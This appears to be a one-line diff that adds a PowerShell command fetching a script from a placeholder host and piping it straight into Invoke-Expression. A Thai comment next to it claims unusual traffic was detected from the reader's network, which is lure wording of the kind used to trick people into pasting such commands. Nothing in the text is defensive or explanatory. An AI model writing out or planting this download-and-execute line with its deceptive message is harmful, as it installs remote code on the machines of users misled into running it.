@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # ระบบของเราตรวจพบการเข้าชมที่ผิดปกติจากเครือข่ายของคุณ
